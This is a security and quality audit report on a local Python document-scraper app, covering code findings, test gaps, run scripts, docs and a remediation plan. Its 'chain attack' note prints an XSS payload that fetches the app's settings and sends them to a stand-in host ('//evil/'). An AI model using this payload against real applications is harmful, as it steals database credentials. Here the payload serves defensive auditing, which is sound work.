# Website Document Scraper — Evaluation 2026-05-19

**Author:** Q. Spencer (with Claude Opus 4.7)
**Plan:** `EVALUATION_PLAN_2026-05-19.md`
**Application:** single-user local utility, ~5.6k LOC Python + ~4.4k LOC Jinja templates
**Baseline commit:** `e21a3ea` (with 10 uncommitted files in the working tree — treated as backlog, see §5)

---

## 0. Executive Summary

**Strengths**

1. **Test discipline at the macro level.** 449 tests pass deterministically in ~5.7 s across 3 consecutive runs. Zero flakes. Coverage is 78 % line-wide.
2. **Clean codebase signals.** Zero `TODO/FIXME/XXX/HACK` markers across the repo. No `subprocess`/`os.system` calls in `app/`. All settings have clamped numeric bounds. Filename sanitization is centralized in one helper (`app/utils/file_utils.py:171`) and used at every local-write site.
3. **Graceful external-dependency degradation.** Both Stirling-PDF (`app/services/stirling_pdf_service.py`) and Playwright (`app/services/browser_service.py`) tolerate missing dependencies with a logged warning rather than a 500.
4. **AI integration done right where it counts.** Uses `max_completion_tokens` (gpt-5.x correct), retries with exponential backoff, structured JSON parsing, separate prompt for spreadsheet metadata.

**Weaknesses worth front-loading**

5. **Chain attack (three P0s combine into one exploit).** Scraped page → XSS in `results.html` → reads `/api/settings` → exfiltrates **unmasked** `mongodb_uri` (including embedded `user:pass@`). Details in §1. Single-user-on-localhost framing does not neutralize this; the attacker is *the scraped site*, not a network peer.
6. **Critical paths are entirely mocked.** MongoDB GridFS storage (336 LOC, **51 %** covered) and AI summarization tests never touch the live backends, despite both being available. A refactor of `mongodb_service` internals would pass all tests while breaking storage. `stirling_pdf_service.py` is **0 %** covered.
7. **`requirements.txt` rot.** All deps are `>=`-pinned with no lockfile; installed venv has **25 CVE matches** across 11 packages (10 in `aiohttp 3.13.3` alone). `python-pptx` is *imported* but absent from the file — every `.pptx` scan currently crashes with `ImportError`.
8. **Docs vs. reality drift.** README says `--port 8001`; `scripts/run.sh` uses 8000 and the README never mentions the script. Docker is a hard prerequisite for OCR but isn't named in installation. `docs/architecture.md` predates roughly half the code (no MongoDB, no AI, no Stirling, no History, no Documents tab). Architecture diagram and project tree are both wrong.
9. **`scripts/run.sh` carries one destructive bug** (kills any unrelated process holding port 8000 without confirmation) and one data-loss bug (`> "$LOG_FILE"` truncates `logs/uvicorn.log` on every run, wiping the prior session's crash trace).
10. **In-flight work overhang.** 10 files modified in the working tree (+473/−95 LOC) across summarization, extraction, downloads, and two templates — substantial unmerged work; either land or back out before the next push.

---

## 1. Code Quality

**Summary.** Backend code reads cleanly, no broad anti-patterns, but two narrow classes of defect dominate: (a) **secret-leakage paths** that surface API-key / Mongo-URI to logs and to the browser, and (b) **scraped-content propagation into HTML/JS without escaping**, which together form a real exploit chain. Architecturally, in-memory session dicts grow unbounded and one route module reaches into another's globals.

**Findings**

| # | Sev | File:line | Issue | Remediation |
|---|---|---|---|---|
| 1.1 | **P0** | `app/templates/results.html:1199,1310` | Scraped `doc.url`, `doc.filename`, `doc.error_message` interpolated into `innerHTML` and into `onchange="toggleDocument('${doc.url}',…)"` without escaping. `escapeHtml()` helper exists at line 1487 but is bypassed here. | Route every `${...}` of scraped data through `escapeHtml()`; replace inline `onchange` with `addEventListener` + `data-url` so URLs never enter JS source. |
| 1.2 | **P0** | `app/services/settings_service.py:38` | `logger.info(f"Settings loaded: {self._settings}")` dumps `mongodb_uri` + `ai_api_key` to whatever handler is active at import time. | Replace with a redacted summary (`"Settings loaded: %d keys"`) or filter sensitive keys before formatting. |
| 1.3 | **P0** | `app/api/routes/settings.py:52` | `mongodb_uri` returned to browser **unmasked**; `ai_api_key` is correctly masked. URI containing `user:pass@` is in DOM, JSON response, browser history. | Apply the same masking pattern used for `ai_api_key` (regex on `mongodb://`/`mongodb+srv://` to redact the userinfo segment); require an explicit "show" gesture to reveal. |
| 1.4 | P1 | `app/api/routes/downloads.py:411,470,561,591,708` | Five `asyncio.create_task(...)` calls with no reference retained — task may be GC'd mid-run, never awaited, no shutdown handling. Root cause of the `coroutine was never awaited` warning. | Module-level `_background_tasks: set[Task] = set()`; `t.add_done_callback(_background_tasks.discard)`. Or use FastAPI `BackgroundTasks`. |
| 1.5 | P1 | `app/services/text_extraction_service.py:85` | `from pptx import Presentation` — but `python-pptx` is **not in `requirements.txt`**. Every `.pptx` extraction currently raises `ImportError`. | Add `python-pptx>=0.6.21` to `requirements.txt`. |
| 1.6 | P1 | `requirements.txt` (all lines) + installed venv | 25 CVE matches in installed venv (10 in `aiohttp 3.13.3` → 3.13.4 fixes; also urllib3, lxml, idna, requests, pygments, python-multipart). `pip-audit --strict` against the loose `>=` requirements returns 0, hiding the rot. | Generate a lockfile (`pip-compile` or `uv pip compile`); pin upper bounds; upgrade aiohttp first. |
| 1.7 | P1 | `app/api/routes/scraper.py:72` + `app/api/routes/downloads.py:40` | `scrape_sessions` / `download_sessions` in-memory dicts grow without bound; only shrink when client calls DELETE. Each entry holds full `ScrapeResult` (~MB). Long-running uvicorn leaks memory. | Periodic TTL sweep (asyncio task tracked per F1.4) keyed off `start_time`; cap total session count. |
| 1.8 | P1 | `app/templates/results.html:1216,1326` | Scraped filenames inside HTML attribute values (`title="${doc.filename}"`) — a filename containing `"` breaks out. | Same `escapeHtml` fix as F1.1. |
| 1.9 | P1 | `app/services/mongodb_service.py:256` | `_ensure_indexes()` runs after every successful `store_document` insert (probes index_information per write). | Module-level `_indexes_ensured: bool` guard, or move to FastAPI `startup` event. |
| 1.10 | P2 | `app/api/routes/downloads.py:27` | `from app.api.routes.scraper import scrape_sessions` — route module imports another route module's in-memory state. | Extract both session stores into `app/services/session_store.py`; inject into both routers. |
| 1.11 | P2 | `app/services/ai_summarization_service.py:262,265` | `f"…(URL: {api_url}, model: {model})"` returned in `summary_error`, persisted to MongoDB, exposed via `/mongodb/scan/failed-details`. Query-string tokens in `ai_api_url` leak. | Log URL fully; return host/path only in user-facing error. |
| 1.12 | P2 | `app/schemas/scrape.py:17` | `validate_url` prepends `https://` to anything without scheme — `127.0.0.1:9200` is accepted (SSRF surface; mitigated by localhost-only deployment). | Reject any final `urlparse().scheme` outside `{"http","https"}`; consider an optional RFC1918-block toggle. |
| 1.13 | P2 | 8 sites (see §3.1 agent notes) | Eight `try/except Exception: pass` blocks silently swallow all errors (bandit B110). | Catch narrowest expected; for unavoidable broad catches, `logger.debug` the failure. |
| 1.14 | P2 | `app/services/crawler_service.py:184–229` | `state.visited_urls` / `state.all_documents` grow with only per-batch caps; very large continuations can accumulate unbounded URLs. | Add a hard ceiling (e.g. 50 000 URLs); bail with clear error. |
| 1.15 | P2 | `app/services/ai_summarization_service.py` (whole) | Scraped text fed verbatim to LLM; JSON response parsed and stored without sanitization (prompt-injection surface). | Document that summary fields are LLM output not to be used for automation; strip markup before send. |
| 1.16 | P3 | 26 ruff findings (23 auto-fix) | `ruff check app/ --fix` clears unused imports + minor issues. | One command. |
| 1.17 | P3 | `app/main.py:157` | `uvicorn.run(app, host="0.0.0.0", port=8001)` — bandit B104; harmless for CLI dev fallback but inconsistent with `127.0.0.1` framing. | Change host to `127.0.0.1`. |

**Deeper note — the chain attack.** F1.1 (XSS) + F1.3 (unmasked Mongo URI in `/api/settings`) is one exploit, not two findings. A malicious site can serve `<a href="..." filename='"><img src=x onerror="fetch(\'/api/settings\').then(r=>r.json()).then(j=>fetch(\'//evil/\'+btoa(JSON.stringify(j))))">'>` and exfiltrate `mongodb_uri` to the operator's browser the moment the results page renders. Fix both before next use against any untrusted site.

**Static-analysis raw counts.** `ruff`: 26 findings (23 auto-fixable). `bandit`: 1 Medium, 7 Low, 0 High. `pip-audit --strict` on `requirements.txt`: 0. `pip-audit` on the installed venv: **25** across 11 packages.

---

## 2. Automated Tests

**Summary.** Quantity is strong (449 tests, 5.7 s) and discipline is good (descriptive names, scoped fixtures, no error-swallowing). The structural weakness is integration depth: the two highest-value services (MongoDB storage, AI summarization) are 100 % mocked — these are coupling tests, not behavior tests. With both backends live during this evaluation, there is no excuse for not having a thin integration tier.

**Findings**

| # | Sev | File:line | Issue | Remediation |
|---|---|---|---|---|
| 2.1 | P1 | `tests/test_mongodb.py` (all 57 tests) | Every test mocks `_get_client`/`_get_collection`/`_get_db`. A refactor that drops `_get_db` in favor of an injected client would pass every test while breaking storage. | Add `tests/integration/test_mongodb_storage.py` (~5 tests, marker-gated): real store→retrieve→delete round-trip against localhost:27017. |
| 2.2 | P1 | `tests/test_ai_summarization.py` (all 52 tests) | All retry/backoff tests mock `aiohttp.ClientSession`. Real OpenAI is reachable; no test verifies live response-shape parsing. | One `@pytest.mark.live_ai` test against `ai_api_url` with a fixture doc; skip if `AI_API_KEY` empty. |
| 2.3 | P1 | `app/services/mongodb_service.py:14` + `tests/conftest.py:8` | Module-level `_client` MongoClient never closed during test session; pymongo monitor thread keeps polling and tries to log after pytest closes its log capture → reproducible `ValueError: I/O operation on closed file` noise. | Session-scoped fixture finalizer that calls `mongodb_service._client.close()` if non-None. |
| 2.4 | P2 | `tests/test_ai_summarization.py:585,599` | Tests mock the wrong layer — `asyncio` is patched but the coroutine `summarize_pending_documents()` is constructed *before* the mock intercepts. Source of the `coroutine was never awaited` RuntimeWarning. | Patch `ai_summarization_service.summarize_pending_documents` to `AsyncMock()` directly. |
| 2.5 | P2 | `app/services/ai_summarization_service.py:441` (production) | `await asyncio.sleep(1)` rate-limit pause not patched in `TestSummarizePendingDocuments::test_processes_pending_docs` / `test_handles_api_failure` — these two tests cost ~2 s of the 5.7 s suite. | `@patch("app.services.ai_summarization_service.asyncio.sleep", new=AsyncMock())`. |
| 2.6 | P2 | `tests/test_sse_download.py:49` | "Happy path" patches `download_service.download_batch` with a hand-rolled async generator — verifies relay, not download. No test exercises real `store_document` inside the SSE generator. | Integration test using `aiohttp.test_utils` server + real MongoDB. |
| 2.7 | P2 | `tests/test_api.py:13,99,268,822` etc. | Several "page renders" tests check only `status_code == 200`. Acceptable as smoke; mislabeled as behavior tests. | Rename `test_*_smoke`, or assert at least one stable selector per page. |
| 2.8 | P2 | `tests/test_browser_service.py` (all 10) + 0 % `stirling_pdf_service` | Playwright always mocked; Stirling-PDF (95 LOC) has **zero** test coverage despite localhost:8080 being live. | Single `@pytest.mark.playwright` test fetching a static fixture; single Stirling round-trip test. |
| 2.9 | P3 | `tests/test_database.py:9` + `tests/conftest.py:8` | Two parallel temp-DB initialization paths — works today, fragile to future import-time captures of `DB_PATH`. | Move all DB redirection through one helper in `conftest.py`. |
| 2.10 | P3 | `tests/test_calculate_sizes.py:88` | Concurrency-limit test uses real `asyncio.sleep(0.01) * 20` — race-prone on a loaded runner. | Replace timing with `asyncio.Event` released manually. |

**Coverage hotspots:** `stirling_pdf_service.py` 0 %, `mongodb_service.py` 51 %, `text_extraction_service.py` 66 %, `downloads.py` 71 %. Strongholds: `scraper.py` 95 %, `settings_service.py` 95 %, `browser_service.py` 100 % (but all-mock), `core/` 100 %.

**Coverage matrix highlights (10 workflows from the plan, full table in §3.2 audit):** 14 / 17 workflows covered or partial-covered; missing entirely:
- **Re-open past scan**: not a test gap, a **feature gap** — `scan_history` stores only summary stats; the per-scan document list lives in-memory `scrape_sessions` and is lost on restart.
- **Stirling-PDF integration**: 0 %.

**Recommended minimum smoke tier** (~180 LOC total): end-to-end scan against `aiohttp.test_utils` fixture; MongoDB store/retrieve round-trip; local-disk download bytes-match; live OpenAI JSON-keys-present (skip-on-unset); Stirling OCR round-trip (skip-on-unreachable); settings persistence across restart.

---

## 3. Packaging & Runtime Scripts

**Summary.** `scripts/run.sh` is the canonical entry point and does the right thing in the happy path: venv bootstrap → install → test gate → Stirling-PDF container → kill prior uvicorn → background uvicorn. It carries one destructive bug, one data-loss bug, no `trap` handler, and re-runs the full pytest suite (and `pip install`) every dev launch.

**Findings**

| # | Sev | File:line | Issue | Remediation |
|---|---|---|---|---|
| 3.1 | **P1** | `scripts/run.sh:42-46` (`cleanup_old_process`) | `lsof -ti :8000 \| xargs kill -9` runs unconditionally — kills **any** unrelated process holding port 8000, no confirmation, no PID-match check. | Only kill PIDs matching the saved `.uvicorn.pid`; otherwise refuse and print a clear message. |
| 3.2 | **P1** | `scripts/run.sh:136` | `nohup uvicorn … > "$LOG_FILE" 2>&1` uses single `>` — truncates `logs/uvicorn.log` on every run. Prior session's startup output and any crash trace is lost. | Change to `>>` and pre-write a session separator. |
| 3.3 | P1 | `scripts/run.sh:1-155` (no `trap`) | Ctrl-C between `ensure_stirling_pdf` and the `uvicorn` launch leaves the Stirling container running with no app; `pytest`-failure exit doesn't roll back the started container. | `trap cleanup_on_exit INT TERM`; conditionally stop only containers this run created. |
| 3.4 | P1 | `scripts/run.sh:84` (`for i in $(seq 1 30); do … sleep 2`) | 60 s readiness ceiling too tight for `stirling-pdf:2.7.2-fat` cold start (observed firing during pre-flight). | Raise to 180 s; or poll container health state instead of curl. |
| 3.5 | P1 | `scripts/run.sh:68-75` | `docker run -d` lacks `--restart unless-stopped` — after host reboot, container stays stopped until `run.sh` runs again; silent OCR degradation. | Add `--restart unless-stopped`. |
| 3.6 | P1 | `scripts/run.sh:108-121` | Every launch runs `pip install -q -r requirements.txt` and the full pytest suite before starting the app — slows dev loop; a single failing test blocks all use of the app. | `--skip-tests` flag; mtime-skip on install when `requirements.txt` is older than `venv/pyvenv.cfg`. |
| 3.7 | P1 | `.uvicorn.pid` (tracked) + `.gitignore` (no entry) | PID file is in git, rewritten every run → permanent dirty working tree. | `git rm --cached .uvicorn.pid && echo .uvicorn.pid >> .gitignore` (or `*.pid`). |
| 3.8 | P1 | `requirements.txt:1-27` | `>=`-only, no lockfile, no separation of dev/runtime. Combined with §1 finding 1.6: today's `pip install` resolves to a vulnerable set. | Generate `requirements.lock` (`pip-compile`) and install from it; split test deps into `requirements-dev.txt`. |
| 3.9 | P1 | `app/core/logging_config.py:25-32` | `RotatingFileHandler(maxBytes=10MB, backupCount=5)` → 50 MB cap; observed 44 MB on disk. | Drop `backupCount` to 3 or switch to daily `TimedRotatingFileHandler(backupCount=7)`; compress rotated files. |
| 3.10 | P2 | `=2.0.0` at repo root | Zero-byte stray from a `pip install >=2.0.0` typo; tracked in git. | `git rm =2.0.0`. |
| 3.11 | P2 | `requirements.txt:24-27` | `pytest`, `pytest-asyncio`, `pytest-cov` in main requirements — installed into every runtime venv. | Split into `requirements-dev.txt`. |
| 3.12 | P2 | `app/core/database.py:14-15` | `DB_PATH` hard-coded to repo root; only protected from git by the generic `*.db` rule. | `settings.DATABASE_PATH` defaulting to `./data/scraper.db`; create `data/`, gitignore it. |
| 3.13 | P2 | `scripts/run.sh:50-93` | If user manually retags or upgrades the Stirling image, existing-container reuse by name skips the update. | Compare `docker inspect -f '{{.Config.Image}}' "$STIRLING_NAME"` to `$STIRLING_IMAGE`; recreate on mismatch. |
| 3.14 | P2 | `.gitignore` | Missing `*.pid`, `.ruff_cache/`, `data/`. | Add. |
| 3.15 | P3 | repo root | No `pyproject.toml` — no structured packaging, no central place for tool config (`ruff`, `pytest`, `mypy`). | Minimal `[project]` + `[tool.*]` sections. |

**`run.sh` failure-mode summary (acceptable / not):**

| Scenario | Acceptable? |
|---|---|
| (a) `docker` missing | ✅ Warning + continue (intent) |
| (b) broken venv | ⚠️ `pip install` fails ungracefully — no hint to `rm -rf venv` |
| (c) unrelated process on :8000 | ❌ Force-killed (F3.1) |
| (d) Stirling probe times out | ⚠️ Warning, container left running — may be ready 30 s later |
| (e) pytest fails | ❌ Stirling started, app never starts, no rollback |
| (f) Ctrl-C between steps | ❌ Whatever was started is orphaned |

**Stirling-PDF / Playwright integration:** both gracefully degrade — no 500 paths when external dep is absent. Confirmed via reads of `app/services/stirling_pdf_service.py` (every callable returns `None` on exception; caller falls back) and `app/services/browser_service.py:62-98` (caller logs warning and continues with original HTML).

---

## 4. Documentation

**Summary.** Three docs (README 10.6 KB, `architecture.md` 16.2 KB, `user-guide.md` 13.0 KB); no `CLAUDE.md`. README is recent enough to be partially right but contains one P1 onboarding bug (port mismatch); `architecture.md` is the most damaging because it predates roughly half the application. FastAPI's auto-generated `/docs` and `/openapi.json` are healthy (39 paths, 14 schemas) and should be the canonical API reference.

**Findings**

| # | Sev | File:section | Issue | Remediation |
|---|---|---|---|---|
| 4.1 | **P1** | `README.md:75,78` | "Usage" says `uvicorn … --port 8001` and `localhost:8001`; `scripts/run.sh:10` uses 8000; the script is never mentioned. | Replace Usage with `./scripts/run.sh` (canonical); keep manual `uvicorn` as fallback on **port 8000**. |
| 4.2 | **P1** | `README.md` Installation | Docker is a hard prerequisite for OCR (Stirling-PDF) — completely unmentioned. MongoDB called optional but install help links elsewhere. | Add "Prerequisites" subsection: Python 3.12+, Docker (for OCR, optional), MongoDB (optional). |
| 4.3 | **P1** | `docs/architecture.md` (whole) | Predates MongoDB, AI, Stirling, History, Documents tab. Diagram, project tree, API table all wrong. | Either prepend a banner ("Feb 2 snapshot; see README for current") or rewrite. Rewriting is ~half a day. |
| 4.4 | **P1** | `docs/user-guide.md:23-27` | Nav described as History + Settings; actual nav is **Documents + History + Settings**. The Documents page (search MongoDB-stored docs, view summaries) is undocumented. | Add "Browsing Stored Documents" section. |
| 4.5 | P2 | `README.md:105`, `architecture.md:205` | Default Crawl Depth: docs say 2; `app/core/config.py:14` has 5. | Reconcile — change docs to 5 (or change code if 2 was intended). |
| 4.6 | P2 | `README.md:106`, `architecture.md:206`, `user-guide.md:245` | Maximum Crawl Depth: docs say 5; `app/core/config.py:15` has 10. | Update three docs to 10. |
| 4.7 | P2 | `README.md:194` | `POST /api/scrape/retry/{id}` — actual route is `GET` (`app/api/routes/scraper.py:309`). | Change "POST" → "GET". |
| 4.8 | P2 | `README.md:201,212` | Missing endpoints: `POST /api/download/create-directory`, 5 MongoDB endpoints (`summary-stats`, `summarize`, `retry-failed`, `failed-details`, `export/csv`). | Add rows. |
| 4.9 | P2 | `docs/architecture.md:228` | `scan_history` marked "(Reserved for future use)" — actively used by `history_service.py`. | Remove; describe schema. |
| 4.10 | P2 | `docs/user-guide.md` Troubleshooting | No coverage for Stirling-PDF not starting, Playwright missing, AI summarization failures. | Add subsections. |
| 4.11 | P3 | `README.md:163` | "Test suite (391 tests)"; actual is 449. | Drop the count or generate. |
| 4.12 | P3 | `app/` (overall) | Docstring coverage 68 % per `interrogate`. `settings_service.py` 19 % (mostly property pairs), `schemas/scrape.py` 0 %. **No stale docstrings found** in spot-checks — what's documented is accurate; what's missing is missing, not wrong. | One-line docstrings on Pydantic schemas and non-obvious setters; leave trivial getters alone. |

**Fresh-clone onboarding estimate:** ~25 min (Docker + MongoDB already present) / ~75 min (cold install). README's port mismatch likely costs 5–10 min of confusion before the user notices `scripts/run.sh`.

---

## 5. Outstanding Work

**Summary.** No prior evaluation existed; this section is built bottom-up from code sweeps, git history, and the cross-section synthesis from §1–§4.

**Inputs collected**

- **TODO/FIXME/XXX/HACK sweep across all source files: zero matches.** Genuine strength — no breadcrumb backlog.
- **Stale feature-seam comments (1 found):**
  - `app/core/config.py:36` `# AI summarization (Phase 3 prep)` — AI is shipped; comment is misleading.
- **`docs/architecture.md:229`** marks `scan_history` as "Reserved for future use" — covered as F4.9.
- **Commit message bodies are 100 % empty.** 7 commits since project start; every body is blank. No rationale captured for `08beb97 fixes and new features` / `20587cb new storage option` / `e21a3ea updates`. Worth flagging as a P3 process item — future-self has no record of *why* changes were made.
- **In-flight uncommitted work: 10 modified files, +473 / −95 LOC.** Substantial; needs landing or backing out.

**In-flight diff overview**

| File | Lines | Note |
|---|---|---|
| `app/templates/documents.html` | +257 / −big edit | Largest single change; UI refactor of Documents tab |
| `app/services/mongodb_service.py` | +55 | Likely paired with the template change |
| `app/services/ai_summarization_service.py` | +46 | |
| `app/services/text_extraction_service.py` | +41 | |
| `app/api/routes/downloads.py` | +30 | |
| `app/templates/results.html` | +66 | Note: this is the file with the P0 XSS — verify changes don't worsen it or, better, fix it as part of the same change |
| `app/api/routes/scraper.py` | +10 | |
| `tests/test_text_extraction.py` | +59 | Good — tests for extraction changes |
| `tests/test_mongodb.py` | +2 | Suspiciously small for a 55-line service change |
| `.uvicorn.pid` | +1/−1 | Should not be tracked at all (F3.7) |

**Outstanding-work findings**

| # | Sev | Item | Action |
|---|---|---|---|
| 5.1 | P1 | 10-file in-flight diff | Land or back out before next push; specifically verify `mongodb_service.py` changes are accompanied by more than 2 lines of test changes. |
| 5.2 | P2 | "Re-open past scan" feature gap (from §2 matrix) | Decide: feature scope or accept as out-of-scope. If in scope, persist the per-scan document list to SQLite or re-derive from MongoDB. |
| 5.3 | P3 | `app/core/config.py:36` stale "Phase 3 prep" comment | Delete comment. |
| 5.4 | P3 | Empty commit message bodies (7 / 7) | Adopt a minimal convention going forward: subject + 1-paragraph why. |
| 5.5 | P3 | No `pyproject.toml`, no `CLAUDE.md`, no app Dockerfile | Decide per distribution plan; recommend at least `pyproject.toml` + `CLAUDE.md`. |

---

## 6. Recommended Next Steps

Ordered by priority. Effort estimates assume one engineer, no context-switching.

### P0 — fix before next use against any untrusted site (~½ day)

1. **F1.1 + F1.8** — escape scraped content in `results.html` (XSS).
2. **F1.3** — mask `mongodb_uri` in `/api/settings` response.
3. **F1.2** — redact secrets in `settings_service` startup log line.

These three together close the chain attack. Do them in one commit.

### P1 — this week (~3–5 days)

4. **F1.5** — add `python-pptx` to `requirements.txt` (one line; current code is broken for `.pptx`).
5. **F1.6 + F3.8** — generate `requirements.lock`; upgrade aiohttp (closes 10 CVEs); split dev deps.
6. **F3.1** — `scripts/run.sh` PID-match before port-kill (destructive).
7. **F3.2** — `> "$LOG_FILE"` → `>>` (data loss).
8. **F1.4** — fix the five fire-and-forget `asyncio.create_task` sites; closes F2.4 (leaked-coroutine warning) as a side-effect.
9. **F4.1 + F4.2** — fix README port mismatch; document Docker prerequisite; reference `scripts/run.sh`.
10. **F4.3** — banner or rewrite `docs/architecture.md`.
11. **F5.1** — resolve the 10-file in-flight diff.
12. **F2.1 + F2.2 + F2.8** — add a minimal integration tier (`tests/integration/`): MongoDB round-trip, live OpenAI smoke, Stirling-PDF smoke. ~180 LOC total. Closes the structural weakness called out in the executive summary.
13. **F3.3, F3.4, F3.5, F3.6, F3.7, F3.9** — `run.sh` and logging cleanups (trap, Stirling timeout/restart, dev-loop opt-in tests, `.uvicorn.pid` gitignore, log rotation cap).
14. **F1.7 + F1.9** — session-dict TTL sweep; one-time index creation.

### P2 — this month (~1 week)

15. F1.10 (session-store service extraction), F1.11 (AI URL in errors), F1.12 (scheme allowlist), F1.13 (narrow except-pass), F1.14 (crawler hard cap), F1.15 (prompt-injection docs).
16. F2.4–F2.7, F2.9 (test cleanups + speedups).
17. F3.10–F3.14 (`=2.0.0`, dev deps, DB path, image-tag check, `.gitignore`).
18. F4.5–F4.10 (doc reconciliation, user-guide Documents page, troubleshooting).
19. F5.2 (decide on re-open-past-scan feature).

### P3 — when convenient (~few hours total)

20. F1.16 (`ruff --fix`), F1.17 (uvicorn host), F2.10, F3.15 (`pyproject.toml`), F4.11–F4.12 (test count, docstrings), F5.3–F5.5 (config cleanup, commit conventions, CLAUDE.md).

**Cumulative effort:** ~3 weeks of focused work to clear P0 + P1 + most P2; the codebase is then in shape for further feature work without ongoing security/test-debt drag.

---

## 7. Appendix: Methodology

**Plan executed:** `/home/ubuntu/Dev/website-scraper/EVALUATION_PLAN_2026-05-19.md`. Sections §3.1–§3.4 ran as four parallel agents; §3.5 synthesized after their completion; this document is the composed deliverable per §4.3 of the plan.

**Pre-flight verification (per plan §8.3):**
- MongoDB (`mongodb://localhost:27017`, server 8.0.23) — ✅ reachable; GridFS already populated (`documents`, `fs.chunks`, `fs.files`).
- OpenAI API (`gpt-5.4` → `gpt-5.4-2026-03-05`) — ✅ round-tripped trivial request.
- Stirling-PDF (`http://localhost:8080`) — ✅ healthy after `scripts/run.sh` warm-up (first probe within `run.sh`'s 60s window failed; this is F3.4).

**Tools run:**
- Python: `ruff check app/`, `bandit -r app/`, `pip-audit -r requirements.txt --strict`, `pip-audit` (installed venv), `interrogate -v app/`
- Tests: `pytest --collect-only -q`, `pytest --cov=app`, `pytest --durations=20`, three consecutive `pytest -q` runs
- Git: `git grep -nE "TODO|FIXME|XXX|HACK"`, `git log --no-merges --format`, `git status --short`, `git diff --stat HEAD`
- Live probes: `curl` against `/`, `/docs`, `/openapi.json`, `/api/v1/info/status`; `pymongo.MongoClient.admin.command("ping")`; `httpx.post` to OpenAI Chat Completions

**What this evaluation deliberately did NOT do** (per plan §5):
- Authn/authz/CORS/multi-tenancy review — not applicable to single-user local utility
- Infrastructure / CI / deployment review — none exists
- E2E browser-automation suite buildout — recommended in §2, not executed
- Active exploitation / penetration testing — static defensive-coding review only
- User-facing UX review
- Load testing

**Severity calibration:** P0 = data-loss / secret leak / "must fix before next use"; P1 = correctness or defensive-coding, this week; P2 = quality / tech debt, this month; P3 = nice-to-have. Calibrated for a single-user localhost utility — a missing CSRF token is not P0; XSS from a scraped page that exfiltrates DB credentials is.

**Per-section audit reports** were produced by four sub-agents and form the source material for §§1–4 above. The detailed reports (with code excerpts and per-finding rationale beyond what this summary carries) are preserved in the sub-agent transcripts at `/tmp/claude-1000/.../tasks/*.output`. If a future session needs to dig deeper into any single finding, those transcripts are the unabridged record.

**Baseline:** evaluation conducted against committed code at `e21a3ea`. The 10-file uncommitted working tree was treated as backlog (F5.1), not reviewed as shipped code. If those changes land, re-run the §1 + §2 audits over the affected files (`mongodb_service.py`, `ai_summarization_service.py`, `text_extraction_service.py`, `downloads.py`, `scraper.py`, `documents.html`, `results.html`) before treating them as evaluated.
